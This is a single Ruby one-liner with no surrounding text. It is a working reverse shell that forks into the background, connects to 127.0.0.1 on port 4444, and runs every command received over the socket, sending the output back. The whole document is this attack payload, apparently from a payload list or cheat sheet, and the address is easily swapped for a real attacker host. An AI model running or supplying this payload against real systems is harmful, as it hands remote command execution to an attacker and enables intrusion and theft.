ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
